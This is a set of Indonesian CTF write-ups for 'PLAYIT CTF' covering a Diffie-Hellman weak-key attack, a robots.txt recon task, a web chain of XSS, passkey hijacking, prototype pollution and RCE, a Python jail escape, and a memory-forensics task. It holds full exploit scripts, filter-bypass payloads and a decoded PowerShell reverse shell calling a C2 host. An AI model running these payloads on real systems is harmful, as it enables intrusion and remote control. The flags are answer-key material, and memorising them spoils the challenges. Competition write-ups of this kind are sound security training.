# CTF Writeup: Easy Recon

**Event:** PLAYIT CTF  
**Category:** Crypto + Steganography  
**Difficulty:** Very Easy  
**Flag:** `PLAYIT{097ba7612e9f034b012ab}`

---

## Deskripsi

> Tadinya sih mau bikin flagnya langsung jadi string, tapi gajadi.

**NC:** `nc 10.0.2.15 1336`  
**File:** `chall.py`

---

## Analisis Source Code

Server mengimplementasikan Diffie-Hellman key exchange lalu mengenkripsi flag dengan AES-CBC:

```python
def gen_pub_key(size):
    q = number.getPrime(size)
    k = 1
    p = k * q + 1
    while not number.isPrime(p):
        k += 1
        p = k * q + 1
    h = randint(2, p - 1)
    g = pow(h, (p - 1) // q, p)
    while g == 1:
        h = randint(2, p - 1)
        g = pow(h, (p - 1) // q, p)
    return p, g

# Server sends: p, g, k_a = g^a mod p
# Server receives: k_b
# Shared secret: k = k_b^a mod p
# AES key: SHA256(k)
```

Flag dienkripsi sebagai **gambar PNG** (bukan string), lalu disembunyikan via **LSB steganography** di dalam gambar manga.

---

## Vulnerability

**Diffie-Hellman dengan k_b = g**

Server hanya validasi `1 < k_b < p`, tapi tidak cek apakah `k_b` adalah nilai yang "aman".

Kalau kita kirim `k_b = g`:
```
shared_secret = k_b^a mod p
              = g^a mod p
              = k_a  (yang sudah kita terima dari server!)
```

Kita sudah punya `k_a`, jadi kita bisa derive AES key yang sama tanpa tahu private key `a`.

---

## Exploit

```python
import socket
from Crypto.Cipher import AES
from hashlib import sha256

N = 1024

def recvn(s, n):
    buf = b''
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf

def recvall(s):
    buf = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf

s = socket.socket()
s.connect(('10.0.2.15', 1336))

# Receive p, g, k_a
p   = int.from_bytes(recvn(s, N))
g   = int.from_bytes(recvn(s, N))
k_a = int.from_bytes(recvn(s, N))

# Send k_b = g => shared secret = g^a mod p = k_a
s.sendall(g.to_bytes(N))

# Receive encrypted PNG
enc = recvall(s)
s.close()

# Derive AES key from k_a
key = sha256(k_a.to_bytes((k_a.bit_length() + 7) // 8)).digest()

# Decrypt AES-CBC
iv     = enc[:16]
ct     = enc[16:]
cipher = AES.new(key, AES.MODE_CBC, iv)
png    = cipher.decrypt(ct)

with open('flag.png', 'wb') as f:
    f.write(png)
```

---

## Flag Extraction (LSB Steganography)

Gambar hasil decrypt adalah manga biasa, tapi flag disembunyikan di **LSB (Least Significant Bit)** tiap channel RGB pixel:

```python
from PIL import Image

img = Image.open('flag.png').convert('RGB')
w, h = img.size

bits = []
for y in range(h):
    for x in range(w):
        r, g, b = img.getpixel((x, y))
        bits.append(r & 1)
        bits.append(g & 1)
        bits.append(b & 1)

result = bytearray()
for i in range(0, len(bits)-7, 8):
    byte = 0
    for j in range(8):
        byte = (byte << 1) | bits[i+j]
    result.append(byte)

print(bytes(result).split(b'\x00')[0].decode())
# PLAYIT{097ba7612e9f034b012ab}
```

---

## Summary

1. Connect ke server, terima `p`, `g`, `k_a`
2. Kirim `k_b = g` (DH weak key attack)
3. Shared secret = `k_a` (sudah diketahui)
4. Decrypt AES-CBC -> dapat PNG gambar manga
5. Extract LSB dari pixel RGB -> dapat flag

**Flag:** `PLAYIT{097ba7612e9f034b012ab}`

---
---

# CTF Writeup: IHatePDF

**Event:** PLAYIT CTF  
**Category:** Web  
**Difficulty:** Very Easy  
**Flag:** `PLAYIT{its_4ll_mooz_fault_XD}`

---

## Deskripsi

> My friend told me that my vibe-coded app got compromised. But since i realize I HATE PDFs so much, so I just let it be. Besides, they should be in the jail, right?
> My AI token now is at 19 million anyway, so I'll just make another file converter...

**URL:** `http://10.0.2.15:3204/`

---

## Recon

Aplikasi ini adalah PDF to Image converter sederhana. Fitur utama:
- Upload PDF, convert ke JPG
- Ada halaman login/register
- Halaman Merge/Split/Compress masih "Under Construction"

### Step 1: Cek robots.txt

```
GET /robots.txt

Disallow:
/public/pwned
```

Ada path `/public/pwned` yang di-disallow. Dari deskripsi soal, app ini sudah "compromised", jadi kemungkinan attacker meninggalkan jejak di situ.

### Step 2: Akses /public/pwned

```bash
curl -s http://10.0.2.15:3204/public/pwned
```

Langsung keluar isi directory yang berisi:
- Flag berulang kali: `PLAYIT{its_4ll_mooz_fault_XD}`
- Output `cat: 057flag: No such file or directory`
- Beberapa file PDF (dari author "Sultan Zaky" dan "BoonieX _")
- Marker string `ZAKY_MARKER_12345`

Flag langsung visible di response body.

---

## Analisis

Ini simulasi app yang sudah di-hack. Attacker (mooz?) menaruh webshell/backdoor dan meninggalkan artefak di `/public/pwned`. Hint dari:
1. **robots.txt** - classic misconfiguration, disallow bukan berarti blocked
2. **Deskripsi soal** - "got compromised", "they should be in the jail" (referensi ke path yang harusnya restricted)

---

## Summary

1. Akses target URL
2. Cek `/robots.txt` -> dapet hint path `/public/pwned`
3. Akses `/public/pwned` -> flag langsung terexpose

**Flag:** `PLAYIT{its_4ll_mooz_fault_XD}`

---
---

# CTF Writeup: Fallback

**Event:** PLAYIT CTF  
**Category:** Web  
**Difficulty:** Medium/Hard  
**Flag:** `PLAYIT{e0513aeea0b76d033322ebb7bf067141}`

---

## Deskripsi

> Reviews are supposed to be simple: submit, wait, done.
> This one has been patched a few times, and the newest flow looks clean enough. The older parts are probably fine too.

**URL:** `http://10.0.2.15:3000/`  
**Stack:** Hono + Bun + SQLite + Puppeteer bot

---

## Screenshots

### Landing Page
![Landing Page](web/fallback/screenshots/01-landing.png)

### Register Page
![Register](web/fallback/screenshots/02-register.png)

### Dashboard
![Dashboard](web/fallback/screenshots/03-dashboard.png)

### XSS Payload Injection
![XSS Payload](web/fallback/screenshots/04-xss-payload.png)

### Flag Output (RCE)
![Flag](web/fallback/screenshots/05-flag-output.png)

---

## Analisis

Aplikasi ini adalah sistem incident review dengan fitur:
- User register/login
- Submit incident report (masuk queue personal/admin-review)
- Admin review via bot (Puppeteer)
- WebAuthn/Passkey authentication
- Report profiles dengan "compat patch" system (legacy migration)

---

## Vulnerability Chain

### 1. XSS Sanitizer Bypass

File: `src/lib.ts` - fungsi `sanitizeHtml()`

Regex yang dipakai untuk strip event handlers:
```js
/<(\w+)(\s+)on\w+\s*=/gi
```

Regex ini butuh `\s` (whitespace) sebelum `on*` attribute. Tapi kalau pakai `/` sebagai separator (valid di HTML), regex tidak match:

```html
<svg/onload="eval(...)">
```

### 2. Parameter Pollution

File: `src/routes/challenge.ts` - endpoint POST `/api/incidents`

```js
const queue = params.get("queue");        // FIRST value -> "personal" (passes validation)
const allQueues = params.getAll("queue");  // ALL values
const finalQueue = allQueues.at(-1);       // LAST value -> "admin-review" (stored)
```

Payload: `queue=personal&queue=admin-review`

### 3. Passkey Registration via XSS

Bot visit halaman incident sebagai admin. XSS jalan di context admin:
1. Fetch `/api/passkeys/register/options` (dapet challenge)
2. Buat fake authenticator response dengan public key kita
3. POST ke `/api/passkeys/register/verify` (register passkey ke akun admin)

`rpIdHash` = SHA256("127.0.0.1") karena `APP_ORIGIN` = `http://127.0.0.1:3000`.

### 4. Admin Login via Passkey

Login sebagai admin dengan passkey kita sendiri:
1. GET `/api/passkeys/login/options?username=admin`
2. Sign challenge dengan private key kita
3. POST `/api/passkeys/login/verify`

Session level: `auth_level = "passkey"` (tertinggi).

### 5. Prototype Pollution via Compat Patch

File: `src/lib.ts` - `validateCompatPatch()` dan `applyCompatPatch()`

```js
function hasBlockedRawSegment(key) {
    return key.split('.').some(seg => bannedCompatSegment.has(seg));
}
```

Cek dilakukan pada **raw** (URL-encoded) string. `%5f%5fproto%5f%5f` != `__proto__` jadi lolos. Setelah decode, `applyCompatPatch()` set value via nested key traversal ke `Object.prototype.postRenderFormula`.

### 6. RCE via `new Function()`

File: `src/lib.ts` - `runPostRender()`

```js
function runPostRender(renderConfig, rows) {
    const hookSource = renderConfig.postRenderFormula;
    if (hookSource) {
        const fn = new Function("rows", "Bun", "process", hookSource);
        return fn(rows, Bun, process);
    }
}
```

`renderConfig` inherit dari polluted `Object.prototype`, jadi `postRenderFormula` dieksekusi dengan akses ke `Bun` global.

RCE payload:
```js
var r=Bun.spawnSync(["cat","/flag.txt"]);return new TextDecoder().decode(r.stdout)
```

---

## Exploit Flow

```
Register -> XSS + param pollution -> Bot visit -> Passkey registered
    -> Login admin -> Import report (proto pollution) -> Render -> RCE -> Flag
```

---

## Exploit Script

```python
import requests, json, base64, hashlib, struct, time, os, re, urllib.parse
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://10.0.2.15:3000"
ORIGIN = "http://127.0.0.1:3000"
RP_ID = "127.0.0.1"

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def sha256(data):
    if isinstance(data, str): data = data.encode()
    return hashlib.sha256(data).digest()

private_key = ec.generate_private_key(ec.SECP256R1())
public_key = private_key.public_key()
pub_der = public_key.public_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
PUB_B64URL = b64url_encode(pub_der)
CREDENTIAL_ID = "xpc" + str(int(time.time()*1000))

rp_id_hash = sha256(RP_ID)
auth_data_reg = rp_id_hash + struct.pack('>B', 0x41) + struct.pack('>I', 0)
AUTH_DATA_REG_B64 = b64url_encode(auth_data_reg)

# Step 1: Register
s = requests.Session()
uname = "xp" + os.urandom(4).hex()
s.post(f"{BASE}/register", data={
    "username": uname, "email": f"{uname}@e.co", "password": "p"
})

# Step 2: XSS + Parameter Pollution
inner_js = (
    "fetch('/api/passkeys/register/options').then(r=>r.json()).then(o=>{"
    "var ch=o.publicKey.challenge;"
    "var cd=JSON.stringify({type:'webauthn.create',challenge:ch,"
    "origin:location.origin,crossOrigin:false});"
    "var cdb=btoa(cd).replace(/\\+/g,'-').replace(/\\//g,'_')"
    ".replace(/=+$/g,'');"
    "var body=JSON.stringify({challengeId:o.challengeId,"
    f"id:'{CREDENTIAL_ID}',rawId:'{CREDENTIAL_ID}',"
    "response:{clientDataJSON:cdb,"
    f"authenticatorData:'{AUTH_DATA_REG_B64}',"
    f"publicKey:'{PUB_B64URL}',"
    "transports:['internal']}});"
    "fetch('/api/passkeys/register/verify',"
    "{method:'POST',headers:{'Content-Type':'application/json'},"
    "body:body})})"
)
inner_b64 = base64.b64encode(inner_js.encode()).decode()
xss_payload = f'<svg/onload="eval(atob(\'{inner_b64}\'))">'

raw_body = urllib.parse.urlencode([
    ("queue", "personal"), ("queue", "admin-review"),
    ("title", "Bug"), ("body", xss_payload)
])
r = s.post(f"{BASE}/api/incidents", data=raw_body,
    headers={"Content-Type": "application/x-www-form-urlencoded"})
incident_id = r.json()["incidentId"]

# Step 3: Trigger bot
s.post(f"{BASE}/bot/visit", data={"incidentId": str(incident_id)})
time.sleep(8)

# Step 4: Login as admin via passkey
s2 = requests.Session()
r = s2.get(f"{BASE}/api/passkeys/login/options",
    params={"username": "admin"})
login_opts = r.json()
challenge_id = login_opts["challengeId"]
challenge_b64 = login_opts["publicKey"]["challenge"]

client_data = json.dumps({
    "type": "webauthn.get", "challenge": challenge_b64,
    "origin": ORIGIN, "crossOrigin": False
}, separators=(',', ':'))
client_data_b64 = b64url_encode(client_data.encode())
auth_data_login = rp_id_hash + struct.pack('>B', 0x01) + struct.pack('>I', 1)
auth_data_login_b64 = b64url_encode(auth_data_login)
to_sign = auth_data_login + sha256(client_data.encode())
der_sig = private_key.sign(to_sign, ec.ECDSA(hashes.SHA256()))
sig_b64 = b64url_encode(der_sig)

s2.post(f"{BASE}/api/passkeys/login/verify", json={
    "challengeId": challenge_id,
    "id": CREDENTIAL_ID, "rawId": CREDENTIAL_ID,
    "response": {
        "clientDataJSON": client_data_b64,
        "authenticatorData": auth_data_login_b64,
        "signature": sig_b64
    }
})

# Step 5: Prototype pollution + RCE
rce = ('var r=Bun.spawnSync(["cat","/flag.txt"]);'
       'return new TextDecoder().decode(r.stdout)')
r = s2.post(f"{BASE}/api/admin/report-profiles/import", json={
    "name": "pwn",
    "config": {"title": "x", "rows": ["a"], "formatter": "table"},
    "compatPatch": {"%5f%5fproto%5f%5f.postRenderFormula": rce}
})
rid = r.json()["reportId"]

# Step 6: Render -> Flag
r = s2.get(f"{BASE}/admin/reports/{rid}/render")
flag = re.search(r'PLAYIT\{[^}]+\}', r.text)
print(f"FLAG: {flag.group(0)}")
```

---

## Summary

1. Register user biasa
2. Submit incident dengan XSS (`<svg/onload>`) + parameter pollution
3. Bot visit, XSS register passkey kita ke akun admin
4. Login sebagai admin via passkey
5. Import report profile dengan prototype pollution (`%5f%5fproto%5f%5f.postRenderFormula`)
6. Render report -> `new Function()` execute -> `Bun.spawnSync(["cat","/flag.txt"])`

**Flag:** `PLAYIT{e0513aeea0b76d033322ebb7bf067141}`

---
---

# PLAYIT CTF Writeup

## 1. Translator Magang (Misc)

**Deskripsi:** Seorang mahasiswa sedang magang di kedutaan besar Zalgo untuk Indonesia sebagai translator, tapi dia kadang masih salah paham dengan pekerjaannya.

**NC:** `nc 10.0.2.15 9768`

**Flag:** `PLAYIT{w1_w0k_d3_T0K_N0t_Onle_ToK_d3_T0k}`

### Analisis

Service ini adalah Python eval jail yang menyamar sebagai "translator Zalgo". Alur kerjanya:

1. Input harus dalam Zalgo text (teks + combining Unicode characters) supaya diproses
2. Server strip combining chars, lalu eval hasilnya sebagai Python expression
3. Hasilnya ditampilkan sebagai "penerjemah melakukan: [result]"

### Proteksi

- **Keyword filter:** Block substring `flag`, `open`, `read`, `os`, `__import__`, `globals`, `locals`
- **Length limit:** Maksimal 26 karakter di input pertama
- **Restricted builtins:** Hanya `print`, `eval`, `int`, `str`, `list`, `tuple`, `len`, `range`, `type`, `bool`, `True`, `False`, `None`

### Exploit

**Step 1: Bypass length limit dengan `eval(input())`**

Kirim `eval(input())` dalam Zalgo text (13 chars, di bawah limit). Server akan memanggil `input()` yang membaca baris berikutnya tanpa length limit.

```python
def to_zalgo(text):
    combining = [chr(c) for c in range(0x0300, 0x0305)]
    result = ''
    for char in text:
        result += char
        for c in combining:
            result += c
    return result
```

**Step 2: Python sandbox escape via class hierarchy**

Akses `os._wrap_close` (subclass index 139) untuk mendapatkan `os.popen`:

```python
().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__
```

**Step 3: Bypass keyword filter dengan hex escape**

Gunakan `\x` escape sequences supaya blocked words tidak muncul secara literal:
- `popen` = `\x70\x6f\x70\x65\x6e`
- `flag` = `\x66\x6c\x61\x67`

Gunakan `list()` sebagai pengganti `.read()` karena popen object iterable.

**Step 4: Final payload**

```python
list(().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__["\x70\x6f\x70\x65\x6e"]("cat /\x66\x6c\x61\x67.txt"))
```

### Full Exploit Script

```python
import socket
import time

def to_zalgo(text):
    combining = [chr(c) for c in range(0x0300, 0x0305)]
    result = ''
    for char in text:
        result += char
        for c in combining:
            result += c
    return result

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.15', 9768))
s.settimeout(8)

# Receive banner
data = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
        if b'zalgo> ' in data: break
    except socket.timeout: break

# Send eval(input()) in Zalgo
s.sendall((to_zalgo('eval(input())') + '\n').encode('utf-8'))
time.sleep(1)

# Drain intermediate output
try:
    s.setblocking(False)
    while True: s.recv(4096)
except BlockingIOError: pass
s.setblocking(True)
s.settimeout(8)

# Send actual payload (raw, no zalgo, with hex escapes)
g = '().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__'
payload = r'list(' + g + r'["\x70\x6f\x70\x65\x6e"]("cat /\x66\x6c\x61\x67.txt"))'
s.sendall((payload + '\n').encode('utf-8'))
time.sleep(2)

# Receive flag
data = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
        if b'zalgo> ' in data: break
    except socket.timeout: break

print(data.decode(errors='replace'))
s.close()
```

---

## 2. League of the Legend (Forensic)

**Deskripsi:** Temenlu curiga kalo laptopnya kena virus pas temennya habis nginstallin cheat untuk game LOL, jadi dia minta lu buat bantu ngecekin laptopnya. Temenlu cuma ngasih tau kalo pas nginstall cheatnya, temennya sempet buka terminal kaya di film heker heker.

**NC:** `nc 10.0.2.15 4453`

**Flag:** `PLAYIT{S0m3T1m3s_FR1ends_4re_4lso_3vil}`

### Analisis

Challenge ini memberikan memory dump dari laptop Windows yang terinfeksi malware. Service NC mengajukan pertanyaan-pertanyaan forensik yang harus dijawab berdasarkan analisis dump tersebut.

### Jawaban

- No 1 - Nama hostname komputer korban: `DESKTOP-JU4Q97A`
- No 2 - PID PowerShell yang digunakan untuk koneksi C2: `5032`
- No 3 - Parent PID dari proses PowerShell mencurigakan: `7420`
- No 4 - IP:PORT server C2: `192.168.100.20:1337`
- No 5 - Argumen agar PowerShell tidak tampak di desktop: `-WindowStyle Hidden`
- No 6 - Full registry path untuk persistence: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate`
- No 7 - Command yang mengeksekusi input dari C2: `iex`
- No 8 - Variabel yang menyimpan network stream: `$stream`

### Teknik Analisis

1. **Registry analysis:** Parse `NTUSER.DAT` dengan python-registry untuk menemukan persistence key di `Run`
2. **PowerShell payload decode:** Base64 decode + UTF-16LE decode untuk membaca isi script malicious
3. **Identifikasi C2:** Dari decoded payload terlihat koneksi TCP ke `192.168.100.20:1337`
4. **Command execution:** Payload menggunakan `iex` (Invoke-Expression) untuk menjalankan command dari C2
5. **Stream variable:** `$stream = $client.GetStream()` menyimpan network stream

### Decoded Malicious PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.100.20",1337);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Ini adalah reverse shell klasik yang:
- Konek ke C2 server
- Baca command dari stream
- Eksekusi via `iex` (Invoke-Expression)
- Kirim output balik ke attacker
